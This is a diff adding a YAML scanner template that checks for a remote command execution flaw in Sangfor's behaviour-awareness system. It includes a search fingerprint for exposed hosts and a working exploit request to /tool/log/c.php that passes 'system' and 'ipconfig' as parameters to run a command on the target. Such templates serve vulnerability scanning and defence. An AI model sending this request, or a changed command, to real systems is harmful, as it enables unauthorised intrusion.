@@ -1,0 +1,19 @@
+name: 深信服 行为感知系统 c.php 远程命令执行漏洞
+manual: true
+query: 'body="isHighPerformance : !!SFIsHighPerformance,"'
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /tool/log/c.php?strip_slashes=system&host=ipconfig
+      follow_redirects: true
+    expression: response.status == 200 || response.body.bcontains(b"Windows IP") ||
+      response.body.bcontains(b"IPv6")
+expression: r0()
+detail:
+  author: peiqi
+  links:
+  - http://wiki.peiqi.tech/Goby%20&%20POC.html?q=
+  description: 深信服 行为感知系统 c.php 远程命令执行漏洞，使用与EDR相同模板和部分文件导致命令执行
+  tags: RCE
